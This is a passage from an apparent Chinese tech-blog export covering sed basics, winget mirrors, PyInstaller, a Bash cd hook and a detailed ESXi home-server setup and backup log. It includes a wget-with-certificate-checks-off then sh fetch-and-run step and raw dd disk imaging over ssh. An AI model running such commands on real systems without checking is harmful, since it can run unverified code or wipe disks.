-e，得到加上标题的、完整的输出。 其实，上面的例子只用grep+sed/awk就行，但是为了表现三个编辑器各自的特点，还是安排它们共同完成了这个变换工作。希望这个例子能给你带来一个粗浅的印象。 那么，现在就开始正篇吧。 sed首先说说sed它爹ed，这玩意是个很经典的行编辑器。不光可以交互编辑（类似于Vim，不过只能通过交互式指令输出操作结果，比如p输出当前行内容之类的），而且还能把操作指令存储下来 基本介绍sed是一个流编辑器，它可以对文本文件或标准输入进行处理和编辑。sed的基本用法是： 1sed [options] 'script' file 其中，options是一些可选的参数，script是一些sed命令，file是要处理的文本文件。下面是一些常用的options： -n：只打印匹配到的行，不打印所有行。 -e：可以指定多个script，按顺序执行。 -f：可以从一个文件中读取script。 -i：可以直接修改原文件，而不是输出到标准输出。 -r：可以使用扩展正则表达式。 sed的script由一些地址和命令组成，地址可以指定要处理的行，命令可以指定要执行的操作。下面是一些常用的地址和命令： 地址可以是一个数字，表示行号，如3表示第三行。 地址可以是一个范围，表示行号之间的区间，如3,5表示第三行到第五行。 地址可以是一个正则表达式，表示匹配该模式的行，如/^abc/表示以abc开头的行。 地址可以是$，表示最后一行。 如果不指定地址，默认对所有行进行处理。 命令可以是a，表示在当前行后面添加一些内容，如a\\newline表示在当前行后面添加一行newline。 命令可以是c，表示用新的内容替换当前行，如c\\newtext表示用newtext替换当前行。 命令可以是d，表示删除当前行，如d表示删除当前行。 命令可以是p，表示打印当前行，如p表示打印当前行。 命令可以是s，表示用新的内容替换匹配到的内容，如s/old/new/g表示将old替换为new，g表示全局替换。 示例： 打印1-3行： 1sed -n '1,3p' file.txt 删除1-3行： 1sed '1,3d' file.txt 在所有行前加#： 1sed 's/^/#/g' file.txt 将所有字母大写： 1sed 's/.*/\\U&amp;/g' file.txt 参考资料¹: Linux sed 命令 | 菜鸟教程²: sed 命令快速入门 - 知乎³: sed完全教程 - 知乎 awkgrep","link":"/2023/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/sed%EF%BC%8Cawk%E4%B8%8Egrep/"},{"title":"winget换源","text":"winget 是 Windows 的一个包管理器，可以用来安装、卸载、更新和搜索软件。winget 默认使用的是 Microsoft Store 的源，但是也可以换成其他的源，比如中科大的源。12 如果您想换源，您需要以管理员身份运行终端，然后使用以下命令： 删除默认的源： 1winget source remove winget 添加中科大的源： 1winget source add winget https://mirrors.ustc.edu.cn/winget-source 重置为官方的源： 1winget source reset winget 1: WinGet 源使用帮助 — USTC Mirror Help 文档 2: winget是否可以用国内镜像？ - 知乎","link":"/2023/12/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/winget/"},{"title":"使用PyInstaller打包Python程序","text":"pyinstaller是一个用于将python代码转换为可执行文件的工具，它可以让你在没有安装python环境的电脑上运行你的程序。pyinstaller支持多种操作系统，包括Windows，Linux和Mac OS。在本文中，我将介绍如何使用pyinstaller打包一个简单的python项目，并解决一些常见的问题。 步骤一：安装pyinstaller要使用pyinstaller，你首先需要安装它。你可以使用pip命令来安装pyinstaller，如下所示： 1pip install pyinstaller 如果你使用的是Anaconda或者其他的python发行版，你可能需要在命令前加上conda run或者python -m，例如： 1conda run pip install pyinstaller 或者 1python -m pip install pyinstaller 安装完成后，你可以使用pyinstaller --version命令来检查是否安装成功。 步骤二：编写一个简单的python程序为了演示如何使用pyinstaller打包python项目，我们先编写一个简单的python程序，它只是在控制台输出一句话。我们将这个程序命名为hello.py，并保存在一个名为hello的文件夹中。代码如下： 1print(&quot;Hello, world!&quot;) 步骤三：使用pyinstaller打包程序接下来，我们使用pyinstaller来打包我们的程序。打开命令行窗口，并切换到我们的项目文件夹hello中。然后，输入以下命令： 1pyinstaller hello.py 这个命令会在当前文件夹中生成两个新的文件夹：build和dist。build文件夹中存放了打包过程中生成的临时文件，我们不需要关心它。dist文件夹中存放了我们的可执行文件，以及一些依赖的库文件。我们可以进入dist\\hello文件夹中，双击运行hello.exe文件，就可以看到控制台输出了“Hello, world!”。 步骤四：优化打包结果我们已经成功地使用pyinstaller打包了我们的程序，但是我们会发现，我们的可执行文件有很多依赖的库文件，这使得我们的程序占用了很多空间，并且不方便分发和运行。为了优化我们的打包结果，我们可以使用一些参数来控制pyinstaller的行为。以下是一些常用的参数： -F或者--onefile：这个参数会让pyinstaller将所有的依赖文件打包成一个单独的可执行文件，这样就可以减少文件数量和空间占用，并且方便分发和运行。 -w或者--windowed：这个参数会让pyinstaller将程序打包成一个没有控制台窗口的图形界面程序，这样就可以避免出现黑色的控制台窗口，并且提高用户体验。 -i &lt;icon_file&gt;或者--icon=&lt;icon_file&gt;：这个参数会让pyinstaller将指定的图标文件作为可执行文件的图标，这样就可以自定义程序的外观，并且增加识别度。 --name=&lt;name&gt;：这个参数会让pyinstaller将指定的名称作为可执行文件的名称，而不是默认使用源代码文件的名称。 例如，如果我们想要将我们的程序打包成一个单独的图形界面程序，并且使用自定义的图标和名称，我们可以输入以下命令： 1pyinstaller -F -w -i hello.ico --name Hello hello.py 这个命令会在dist文件夹中生成一个名为Hello.exe的可执行文件，并且使用了我们指定的图标。我们可以双击运行它，就可以看到没有控制台窗口，并且输出了“Hello, world!”。 常见问题及解决方法在使用pyinstaller打包python项目时，可能会遇到一些问题和错误。以下是一些常见问题及解决方法： 问题：打包后运行程序时出现错误提示“Failed to execute script xxx”。 解决方法：这个问题可能是由于缺少某些依赖库或者模块导致的。我们可以使用以下命令来查看错误日志： 1hello.exe --debug all 然后根据日志中提示的缺少哪些库或者模块，我们可以使用以下参数来手动指定它们： --hidden-import=&lt;module_name&gt;：这个参数会让pyinstaller强制导入指定的模块，即使它们没有被源代码显式导入。 --add-data &lt;src;dest&gt;：这个参数会让pyinstaller将指定的数据文件或者目录复制到可执行文件所在目录中，并且保持相对路径不变。 --add-binary &lt;src;dest&gt;：这个参数会让pyinstaller将指定的二进制文件或者目录复制到可执行文件所在目录中，并且保持相对路径不变。 例如，如果我们发现缺少了numpy模块和data目录，我们可以输入以下命令： 1pyinstaller --hidden-import numpy --add-data data;. hello.py 问题：打包后运行程序时出现错误提示“ImportError: DLL load failed while importing xxx”。 解决方法：这个问题可能是由于某些DLL文件没有被正确地复制或者加载导致的。我们可以尝试以下方法来解决： 确保安装了最新版本的Microsoft Visual C++ Redistributable Package。 确保源代码中没有使用相对路径来导入模块或者加载数据。 确保源代码中没有使用os.environ[‘PATH’]来修改环境变量。 使用以下参数来手动指定DLL文件或者目录： --paths &lt;path&gt;：这个参数会让pyinstaller在寻找模块和DLL时添加指定的路径。 --add-binary &lt;src;dest&gt;：这个参数会让pyinstaller将指定的二进制文件或者目录复制到可执行文件所在目录中，并且保持相对路径不变。 例如，如果我们发现缺少了libzmq.dll文件，并且它位于C:\\Python\\Lib\\site-packages\\zmq目录下，我们可以输入以下命令： 1pyinstaller --paths C:\\Python\\Lib\\site-packages\\zmq --add-binary C:\\Python\\Lib\\site-packages\\zmq\\libzmq.dll;. hello.py","link":"/2023/05/31/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8PyInstaller%E6%89%93%E5%8C%85Python%E7%A8%8B%E5%BA%8F/"},{"title":"基于Bash的目录级环境配置工具","text":"最近对于Bash愈发迷恋，几乎任何会花费我超过30秒时间的任务，我都会考虑打个脚先写个脚本搞定。再比如说写博客，这种纯输出流就很适合Vim啊，作为一个Vim批必然是原教旨主义最好啊： 但是除了截图粘贴不方便外，还有一些比较难受的地方。在Obsidian里边我是能直接用插件的各种功能快速编写博客的，虽然在Bash终端环境下编写脚本确实更方便了，但是脚本一多，目录就乱的不能看力： 12345678910111213141516# 强迫症是病，得治.├── about├── _archive├── deploy.sh├── _draft├── how-much-did-i-write.sh├── img├── img-uri-process.sh├── _inbox├── links├── new-post.sh├── _posts└── _scaffolds9 directories, 4 files 三个脚本，一个是统计字数的，一个是用sed处理图片链接的，还有一个是从模板新建博客的。每次打开目录看到这仨在中间总觉得很别扭。 除了这，还有就是用起来也不方便：前面要是不加./就能直接用就好了懒也是病得治 所以，需求大概就是这样：目录级别的环境变量配置，并且支持还得够完善，不能离开目录了配置还在生效，不然脚本在其他目录跑飞了想想就恐怖。 Basic Implementation首先定位清楚，这个对cd的Hook只是在指令完成后，加载或者取消配置局部环境变量。因此大概实现方式和结构都有合适的选择。 程序扔~/.bashrc里，或者/etc/profile里。不过我一般在GUI用konsole比较多，所以就放.bashrc里了，也方便dotfile管理。 把具体实现用alias赋别名为cd达到重载（或者说Hook)cd的目的。 基于上面这两条，这是我写一个粗略实现（没干掉bash基本使用就是能用 123456789101112131415function cd_hook() { # The normal cd if [ $# == 0 ]; then cd else cd &quot;$1&quot; fi # If the dir contains bashrc, launch the sub shell and load it if [ -f &quot;.bashrc&quot; ] &amp;&amp; [ &quot;$(pwd)&quot; != &quot;$(getent passwd $USER | awk -F ':' '{print $6}')&quot; ]; then pushd . &gt; /dev/null bash --init-file &lt;(cat /etc/profile ~/.bashrc .bashrc) fi}alias cd='cd_hook' 上面有依托用来检测是否是家目录的指令来避免套娃（虽然理论上充重复加载家目录配置应该没啥）,然后是检测当前目录下（因为是先cd过去的嘛，所以pwd已经变了）是否有.bashrc，有的话就把它作为子参数，和家目录下的bashrc一起传给子bash，然后启动它。 这样就能实现cd后自动加载目录下的配置了。赶紧试试： 12345678910111213141516171819202122232425# My blog's utiilties and aliasesset -eTMPL=$(find ./_scaffolds | grep .md)function deploy() { cd .. ( rm -rf deploy &amp;&amp; cp -r blog deploy cd deploy &amp;&amp; git checkout deploy cp -r blog deploy/source cd deploy &amp;&amp; pnpm i &amp;&amp; pnpm run server )}function image_url_proc() { find . -type f -name &quot;*.md&quot; -exec sed -i 's/\\!\\[\\[\\(.*\\)\\/\\(.*\\)\\]\\]/\\!\\[\\2\\]\\(\\/img\\/\\2\\)/gi' {}}function new_post() { sed -e &quot;s/{{title}}/$1/&quot; -e &quot;s/{{date}} {{time}}/$(date '+%Y-%m-%d %H:%M:%S')/&quot; $TMPL}function line_count() { echo &quot;You have wrote $(find _* -name *.md | xargs cat 2&gt;/dev/null | wc -l) lines in total!&quot;} cd到目录里边试试line_count： 123xeonds@ark-station-breeze:~/Documents/blog$ line_countYou have wrote 36570 lines in total!xeonds@ark-station-breeze:~/Documents/blog$ 好好好，再看看目录结构： 123456789101112.├── .bashrc├── about├── _archive├── _draft├── img├── _inbox├── links├── _posts└── _scaffolds 9 directories, 1 files 爽死。 慢着，里边还有一行pushd呢。嗯，这是后面用来实现自动退出子Shell的关键。具体实现等到下一部分再说吧，先睡了。 后来感觉这样有点太麻烦了，于是就把脚本简化了一下： 12345678function cd() { builtin cd &quot;$@&quot; if [[ -f &quot;$PWD/.bashrc&quot; ]]; then exec bash --rcfile &lt;(cat ~/.bashrc &quot;$PWD/.bashrc&quot;) else exec bash --rcfile &lt;(cat ~/.bashrc) fi} 逻辑很简单，先直通参数执行完内置cd，然后判断目的目录底下有没有.bashrc，有的话直接exec一个新的bash来加载这个配置文件和~/下的默认配置；如果没有的话，也exec一个新的bash替换当前进程。 之所以到一个新目录都要开一个新的进程替换当前进程，是为了使得只有在当前目录底下才可以使用当前文件夹的环境变量。不过这也带来了新的问题：那就是执行一些包含cd的脚本时，会因为exec用新的进程覆盖了当前进程的原因，导致脚本执行终止。 最后想了下，Makefile不也挺好用的（笑）。","link":"/2023/09/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E5%9F%BA%E4%BA%8EBash%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BA%A7%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/"},{"title":"ESXi折腾小记","text":"序其实理论上这玩意早都折腾好了。 只不过不满意于当时的家用板子（B450MK+1500X）对于ESXi兼容性太差，后来又换回了Windows+VMWare的组合。这组合咋用咋不爽，所以最后攒了点钱，整了一套服务器平台（联想的X99板子+E5 2680V4 x2+16G DDR4 ECC，一共大概600大洋），不过因为一些原因拖到最近才空出时间调试好。 硬件本来机子6月已经装好了，但是一直处于开机不亮屏的状态。昨个跟卖家唠嗑了老久，调试了半天才发现这板子好像只知道集成显卡输出，就好像它不知道自己上边还插着个1080一样。 没办法，集显就集显吧，反正确实能用，还能省点电呢（=。=） 进了U盘，启动ESXi镜像，直接开装。因为是服务器板子，所以不用担心网卡支持之类的问题，反正很顺利地装完了。旁边的弱电柜看着挺好，里边还有个交换机来着，但是看到那密密麻麻的走线，折腾了一下就放弃了（而且这玩意要管理还得插串口线，笑死，根本找不到）。 于是直接把机器插到路由器上了。千兆网，爽死。 整好网络配置之后已经很晚了，遂直接回宿舍，来日再整。 系统昨天才装好ESXi，今天下午急冲冲跑到实验室装好了Ubuntu，然后想整个OpenWRT当旁路由，但是发现目前还没啥必要，于是作罢，就用Ubuntu直接开始吧（反正比Windows好 随便装了装软件啥的。先是试着用刚学的sed给apt换了个源，然后装了docker，zip啥的。有了docker之后，直接把笔记本上的mc服务器扔了上去+docker run光速部署。真香。 然后慢慢折腾回以前的服务。首先是gitea，1.20居然都支持ci/cd了，这不狠狠部署？但是我以前的数据还在硬盘上扔着，于是先整了下物理硬盘的vhd映射。下面记录一下： 打开ESXi的SecureSHell（ssh）服务之后，用它的管理账户密码登录上去，然后运行 1ls /vmfs/devices/disks/ 查看系统挂载的硬盘信息： 123456789101112131415161718192021222324252627282930t10.ATA_____ST2000DM0052D2CW102__________________________________WFL1DE7Tt10.ATA_____ST2000DM0052D2CW102__________________________________WFL1DE7T:1t10.ATA_____ST2000DM0052D2CW102__________________________________WFL1DE7T:5t10.ATA_____ST4000VX0002D2AG166__________________________________ZDHA1DHGt10.ATA_____ST4000VX0002D2AG166__________________________________ZDHA1DHG:1t10.ATA_____ST4000VX0002D2AG166__________________________________ZDHA1DHG:2t10.NVMe____ORICO_V500_128GB________________________0000000000000001t10.NVMe____ORICO_V500_128GB________________________0000000000000001:1t10.NVMe____ORICO_V500_128GB________________________0000000000000001:2t10.NVMe____ORICO_V500_128GB________________________0000000000000001:3t10.NVMe____ORICO_V500_128GB________________________0000000000000001:5t10.NVMe____ORICO_V500_128GB________________________0000000000000001:6t10.NVMe____ORICO_V500_128GB________________________0000000000000001:7t10.NVMe____ORICO_V500_128GB________________________0000000000000001:8t10.NVMe____ORICO_V500_128GB________________________0000000000000001:9vml.010000000020202020202020202020202057464c3144453754535432303030vml.010000000020202020202020202020202057464c3144453754535432303030:1vml.010000000020202020202020202020202057464c3144453754535432303030:5vml.01000000002020202020202020202020205a44484131444847535434303030vml.01000000002020202020202020202020205a44484131444847535434303030:1vml.01000000002020202020202020202020205a44484131444847535434303030:2vml.0100000000303030305f303030305f303030305f30303031004f5249434f20vml.0100000000303030305f303030305f303030305f30303031004f5249434f20:1vml.0100000000303030305f303030305f303030305f30303031004f5249434f20:2vml.0100000000303030305f303030305f303030305f30303031004f5249434f20:3vml.0100000000303030305f303030305f303030305f30303031004f5249434f20:5vml.0100000000303030305f303030305f303030305f30303031004f5249434f20:6vml.0100000000303030305f303030305f303030305f30303031004f5249434f20:7vml.0100000000303030305f303030305f303030305f30303031004f5249434f20:8vml.0100000000303030305f303030305f303030305f30303031004f5249434f20:9 然后找到硬盘对应的编号，然后用vmkfstools把硬盘映射到vhd文件里： 1vmkfstools -z /vmfs/devices/disks/[target disk] /vmfs/voluems/datastore1/[target vhd link name].vmdk 完成之后，在虚拟机编辑里添加硬盘，选择现有硬盘，在里边找到刚才新建的两个硬盘映射vhd文件。 挂载到虚拟机上之后，开机，我们还得把硬盘挂载到系统上。 硬盘加到虚拟机上之后，一般会以/dev/sd[a-z]的形式出现，这种时候只需要用fdisk康康磁盘上有什么好康的分区就行啦。不过我这盘好像被Windows的快速启动污染了，得先在Windows里挂载一下，正常关机才能挂载到Linux底下。 所以，现在本来要装Windows来着，但是突然发现Vmware里边有个叫上载虚拟机的东东： 然后就懒得装了，直接把以前的老虚拟机传上去了。开机前设置下硬盘挂载，然后直接开机再关机，搞定。 配置完成之后，发现果然还是另外整个系统当frp的客户端比较稳定。挑了半天发现还是OpenWRT最方便，于是在OpenWrt软路由固件下载与在线定制编译这里下了个x86架构的编译版本装上了。启动之后应该就能正常访问了，就是得先配置下网络的配置文件（我这边为了网络环境方便访问，配置的是bridge桥接模式，所以得手动重新设置网关、地址之类的）。配置相关的内容，恩山有不少内容可以参考。 总之一番折腾下来配好旁路由和内网穿透以及基本不咋用的局域网代理之后，折腾就基本结束了 直到我发现安装系统选项底下有个MacOS。装都装了，不试试怎么行呢（不过据了解，黑果在ESXi虚拟化环境下体验不行，更建议物理机 TODO：等啥时候加个ssd扩容系统盘再说吧。。空间居然不够用了 自动启动装完机器之后想配置宿主机启动后，子主机跟着自动启动。但是在机器的虚拟机设置里边开开了自动启动之后，却没有按照预期开机自动启动VM。排查一番之后发现原来还有个设置没开。 从左侧导航栏到主机-&gt;管理-&gt;系统-&gt;自动启动，点编辑设置，把自动启动打开就行。 这边的两个延时，指的是ESXi启动/关闭所有虚拟机的间隔时间，全局设置会被主机的设置覆盖。而等待检测信号（Wait for heartbeat）指的是，在VM中安装VMWare工具后，系统启动完成后会告知宿主机。此时，如果这个设置为真，则ESXi会跳过启动等待时间，去启动下一个系统。 磁盘缩容为啥缩小容量呢？因为ESXi系统盘大小不够用了，新系统塞不进去（挠头 装了个Windows Server 2012 R2 Datacenter尝尝鲜，在本子上配置好之后觉得还挺香，遂打算扔服务器上，然后因为上面的原因卡住。 解决方法分两步。先声明一下，我是单磁盘系统，如果是多磁盘还得自己探索探索（ 首先用Disk Genius（其实系统自带的磁盘管理也行）打开vmdk磁盘，然后把系统分区缩小到目标容量，剩下的空间留空就行。完成后保存退出Disk Genuis。 然后用随便一个文本编辑器打开vmdk文件，最上面几行有一行表示磁盘簇大小的，大小是磁盘容量（KB）的二倍，修改它到合适的大小就行。 就是RW一行，改成合适的大小就行。 编辑完成之后直接用VMWare Workstation传到ESXi主机上就OK了。这一点不得不夸下，配套的东西确实挺好用。 服务折腾好服务器了，就得想想作何用途了。整理出来的大概有这些： Service Description gitea 代码托管和CI/CD cloudreve 私有云，数据管理以及WebDAV数据备份同步 minecraft 这肯定必装啊，大型开放世界游戏（无误 jupyter 都装N卡了，不玩玩深度学习？ database 当Web服务后端，香就一个字 compile 这可是56线程啊，我以后写个helloworld都要make -j56（大声 calculate 渲染和其他计算任务倒是可以试试丢上来跑 vm server 给别人也整几个虚拟机用用 web services 挂点WEB服务上去，岂不美哉 mirror site 整个镜像站，功德无量啊功德无量 others 后面再想 先配服务器再想应用场景，有一种先射击再瞄准的美 目前搭建的基本就是gitea, mc, cloudreve, jupyter, mysql这几个，后台还跑着一些运维脚本，目前这些已吃完我的内存了QAQ。总之简述下搭建流程吧。毕竟是个blog不是manual，就不贴太详细的步骤了。如果给出了指令，请确保在理解的情况下，按照真实系统环境执行。 gitea这个搭建起来很简单，直接wget最新的build到你要安装的目录，然后把官方的service配置cat到/etc/systemd/system/gitea.service，再sudo systemctl enable --now gitea.service，之后再在给出的Web链接里配置好服务，最后修改好config.ini再重启服务就好了。 很好用的客户端 cloudreve跟上面基本一样，先wget下来，再运行一下产生配置文件并修改好设置，并配置好systemd的服务管理，最后启动就行。不过，安装完成后，还得配置下存储策略来确定文件存储的物理位置，并在用户组中修改每种用户的空间限额大小和权限等。 这东西我最喜欢的点是支持WebDAV，所以配合上AutoSync之类的客户端，就能实现数据增量备份和同步。 Minecraft喜闻乐见的MC时间。这边我是用Docker开服的，环境最干净，并且最方便于管理。具体参考以前写过的Docker-MC开服的博文。 这次为了运维简单，使用了某docker镜像来开服。官方服的唯一优点估计只剩下官方俩字了，实际表现可以说是一般环境一般，弱网环境逆天。据说原因是因为官方服务器只要丢包发生，无论几个都给你踢了。 所以建议用Paper之类的第三方服务端，性能好的多。 JupyterLab直接python3 -m pip install jupyterlab或者用apt, pacman之类的包管理器安装就行。装完了照着上面的在systemd把它添加为服务就行。装好之后，直接浏览器访问端口使用就行了。 唯一要注意的就是安全性了，注意设个复杂点的密码，小心暴力破解。 database刚好这边有个项目得用数据库，所以就用docker开了个mysql的daemon当数据库。不得不说是真的方便 Compiling Service这部分我是用gitea-action搞定的。其他时候，我一般直接ssh到服务器上手动编译。不过注意，服务器的稳定性至关重要，别随便跑啥若治脚本把服务器玩炸了。数据可靠性很关键。特别是当你的服务器还挂了一堆存着重要数据的硬盘，要是真手欠rm -rf了你哭都没地方去。所以建议这种任务通通扔docker，反正没啥性能损失。 Calculation用JupyterLab能搞定一部分反正他们数据科学的基本全是python，另一部分相对需求较小的，就直接跑专门的计算进程算了。 由于计算任务的强性能需求和性能抢占特性，务必设置守护进程等手段，防止一个计算任务炸了整个服务器。 实在不行在ESXi再开个机器专门跑计算。（ VM Servers打算先搓个轮子，然后基于这个轮子整个自动new container并绑定账号和tty的web service。安全性问题后面再说，这些机器可以用来租借或者提供给其他人学习使用。 Web Services比如可以把XDU-ISC的主页/blog挂上去，或者挂点其他Web服务，比如自动打卡之类的。 Mirror Site给各种大型镜像源整个分流，分担下压力造福开源——不过我这点硬盘容量就算了罢。 2023.11.03 昨天Clash For Windows删库，今天clash core和其他Clash系的全部删库哎 常用软件还是得整份源码小心删库实在不行也能自己维护。 Samba开个Samba给Windows共享用还是挺爽的。Win的Native WebDAV好像有点问题，不然就省事了。 详细配置教程可以参考Ubuntu tutorials - Install and configure samba。我搬个简略版的下来： 123456789101112131415161718sudo apt update &amp;&amp; sudo apt install samba# 创建你要共享的目录mkdir ~/sambashare# 编辑samba配置文件# 为了以命令形式展示这边用了古法编辑# 建议用Vim/sed/nano之类的搞定sudo cat &lt;&lt; EOF &gt;&gt; /etc/samba/smb.conf[sambashare] comment = Samba on Ubuntu path = /home/username/sambashare read only = no browsable = yesEOFsudo systemctl enable --now smbd &amp;&amp; sudo service start samba# 更改samba共享账户和密码# 这个用户账户得是系统中现存的账户sudo smbpasswd -a [username]# 然后根据指引设定共享密码，完成 完成后，从其他机器上以\\\\ip-address\\sambashare就能访问共享的目录。 其他服务其他服务的话，比如我写的NanoOJ就可以挂上去给搞算法竞赛的小东西们训练用，也可以把我写那个XDU-Planet挂上去，聚合大家的博客黑历史博文，还能整点其他的花活。 最近把XDU-Planet贡献给XDOSC社区了，目前挂了很多人的黑历史，可以来Planet看看。 总之，充分利用嘛。 哦对，这两天还搭建了个Overleaf用来写LaTex。把编译阶段的任务甩给服务器做挺爽的。部署指南参考了这篇步骤记录如下： 123456789101112mkdir -p overleaf &amp;&amp; cd overleafwget https://github.com/overleaf/overleaf/blob/main/docker-compose.yml# 上边下下来compose配置之后得先改点地方，比如overleaf的端口，volume的存放路径等docker-compose up -d# 配置完整的TexLive以支持完整编译docker exec -it sharelatex bashcd /usr/local/texlivewget http://mirror.ctan.org/systems/texlive/tlnet/update-tlmgr-latest.sh --no-check-certificatesh update-tlmgr-latest.sh -- --upgradetlmgr option repository https://mirrors.ustc.edu.cn/CTAN/systems/texlive/tlnettlmgr update --self --all # luaotfload-tool -futlmgr install scheme-full 最下边的tlmgr install就是用来安装各种CTAN包的工具。以后有缺失的包时可以按需安装。 运维服务器的躯体是硬件，灵魂是数据。物理上的安全备份这里先不论，这里主要说说数据上的安全和管理。 数据安全磁盘上的数据无非就程序，配置和存储的重要数据文件这三类，下面分开说。 程序大部分程序只是一份可以重新安装下载的数据文件，所以我们只需要备份它的程序列表即可。在迁移系统或者出现重大损失时，我们只需要拿到程序列表，然后用你最喜欢的包管理器批量安装这些程序即可。假设你使用apt作为包管理器：前者可以通过dpkg --get-selections &gt; backup.txt做到，后者可以通过sudo apt-get update &amp;&amp; sudo apt-get install $(awk '{print $1}' backup.txt)做到。 当然，上面的实现只是最基础的。我们可以使用awk, git等工具把这件事做的更好。以上面两行脚本为基础原理，我们可以编写一个借助git进行备份记录的版本控制和备份，借助awk让备份的程序列表更加可读和强大，借助alias和bashrc为安装增加一个更新应用列表的hook，利用crontab实现备份的无人值守和自动化，并且可以增加应用的版本信息以及特定版本安装等等。 甚至，对于不在apt的软件，也可以手动记录，甚至是直接保存ELF到备份仓库中。 借助这个工具，灾难恢复也会变得相对简单。 TODO：后边实现这个脚本，先插个flag在这 配置Linux下的大多数配置文件因为都以一个点（dot）开头，所以也叫dotfile。我总结的最佳实践应该是利用Git和Hard-Link去进行管理。比较麻烦的是dotfiles的恢复，这个工作也可以写一个脚本完成，自动根据记录的配置文件路径（存储于csv文件中）去自动创建硬链接来管理。这个方法基本没啥问题，就是容易遇到各种莫名其妙的失效问题，以及在termux里边由于没有root权限不能创建符号链接就很难受。 这里有篇文章，讲解的更加详细：Best way to manage your dotfiles，也比较接近我的观念。还有这篇也值得参考：Best way to manage your dotfiles 参考上面的思路，对dotfiles的管理可以帮你在你电脑炸了的时候快速重建你的环境配置，以及回溯以前的配置文件，又或者是同步你的环境到其他机器上。舒适度拉满.jpg 数据这部分我做的最早。不过方案嘛，主打一个能用就行。 具体而言，首先在各个需要备份的目录下写一个backup.sh来生成要备份的文件，比如这个： 12345#!/bin/bashFNAME=&quot;[backup]mc-server-$NAME-$(date +%Y%m%d%H%M%S).zip&quot;NAME=&quot;my-server&quot;zip -qr $FNAME $NAME/echo $FNAME 注意，必须输出生成的文件名称，后面有用。 然后随便找个地方写个脚本： 123456789101112131415161718192021222324#!/bin/bash# 使用Bash实现的自动备份工具# 注意，绝对不能备份当前目录，不然会产生无限递归BACKUP_DIR=$(dirname &quot;$0&quot;)set -e # 在出现错误时自动退出set -u # 在使用未定义的变量时自动退出set -o pipefail # 在管道中的任何一个命令出错时自动退出while IFS= read -r line; do # 循环处理每一个备份任务 if [[ -z &quot;$line&quot; || &quot;$line&quot; =~ ^# ]]; then # 不执行注释和空行 continue fi # 使用awk得到任务参数 SOURCE=$(awk -F, '{print $1}' &lt;&lt;&lt; &quot;$line&quot;) TARGET=$(awk -F, '{print $2}' &lt;&lt;&lt; &quot;$line&quot;) MAX=$(awk -F, '{print $3}' &lt;&lt;&lt; &quot;$line&quot;) # 最大保留备份数量 echo &quot;[$(date)] Backing up $SOURCE to $TARGET with max $MAX items&quot; cd &quot;$SOURCE&quot; &amp;&amp; ./backup.sh | xargs mv -t &quot;$TARGET&quot; echo &quot;[$(date)] Backup source $SOURCE completed&quot; cd &quot;$TARGET&quot; &amp;&amp; ls -t | tail -n +$((MAX+1)) | xargs rm -fdone &lt; &quot;$BACKUP_DIR/config.csv&quot; # 备份任务配置数据位于脚本所在目录 注释比较详细就不细说了。接下来在同级目录下touch config.csv来保存备份条目信息，举个例子： 12# src,target,max-items/home/xeonds/mc-server,/mnt/c/backup/mc-server-backup/atelier-of-zimin,4 然后把上面的脚本加入crontab中定时运行： 10 4 * * * output=$(/home/xeonds/backup/backup.sh); pushplus &quot;自动备份任务完成&quot; &quot;$output&quot; 上面的就是我正在用的的自动备份方案，pushplus参考我写的Bash学习笔记。 总体就突出一个刚好能用。 另外我记得好像推荐rsync做增量备份的来着，不过我的这些数据可能不太适合增量备份所以没用。如果是照片一类的文件，倒是很适合rsync来处理。回头可以抽空升级下这个脚本。 备份服务器在继续阅读之前，永远保证数据安全，root的无上权限永远意味着使用者的责任，按下回车之前一定再三检查指令！！！ 1ssh username@server_ip &quot;sudo dd if=/dev/sdX bs=4M status=progress&quot; | dd of=/path/to/local/backup/server_root.img bs=4M 上面的指令，将远端服务器的一个分区直接备份到本地的一个文件中，块级别拷贝，安全可靠，就是dd指令特别危险，得谨慎使用。 还原的时候，在目标计算机上启动Live CD进入一个临时系统，挂载磁盘然后用合适的指令还原数据： 1dd if=/path/to/local/backup/server_root.img bs=4M status=progress | ssh username@new_server_ip &quot;sudo dd of=/dev/sdY bs=4M status=progress&quot; 如果是同一服务器备份还原，那还原之后直接用就行了。但是如果服务器硬件不一致的话，那就得重新配置一些东西了。 保证启动配置正确 我用的是GRUB，解决方案如下。基本就是重新安装然后更新引导项。 123456789# Assuming /mnt is the mount point of the restored systemsudo mount /dev/sdY1 /mnt # Mount the root partitionsudo mount --bind /dev /mnt/devsudo mount --bind /proc /mnt/procsudo mount --bind /sys /mnt/syssudo chroot /mnt /bin/bashgrub-install /dev/sdYupdate-grubexit 磁盘大小恢复 使用dd恢复有一个问题，就是如果新的系统盘变大了，那还原之后系统可能还以为大小和以前一样。这种情况就需要： 12sudo resize2fs /dev/sdY1df -h # check whether the disk size covers the entire partition 完事之后可能还需要用gparted之类的东西变一下磁盘大小。 更新磁盘UUID 这玩意其实其他地方也会需要，比如硬盘UUID因为各种玄学原因变化了。 12sudo blkid /dev/sdY1sudo vi /etc/fstab # 更新其中对应设备的UUID 另外就是如果在/etc/default/grub里边的GRUB_CMDLINE_LINUX里边也指定了，那也得改成对应的。改完之后sudo update-grub。 完事重启，应该就能正常使用了。 如果服务器是全新安装，并且采用UEFI启动的话，那必须手动重建EFI分区，而且它得是硬盘的第一个分区。详细参考这里：全新安装 - archlinux简明指南 不过我自己迁移的时候因为几块硬盘倒来倒去太麻烦，索性就直接重装系统了。迁移之后，对于之前的数据恢复，找到那个备份生成的.img文件，用下面的指令挂载然后恢复数据就行： 1sudo mount -o ro,noload server-old.img ./old/ 上面的镜像和要挂载的目录改成你自己需要的就行。要迁移的项目就下面几个： 名称 路径 crontab /etc/cron.*/和crontab -l的内容 home下的各种服务 ~/ 各种自定义脚本 /usr/local/bin 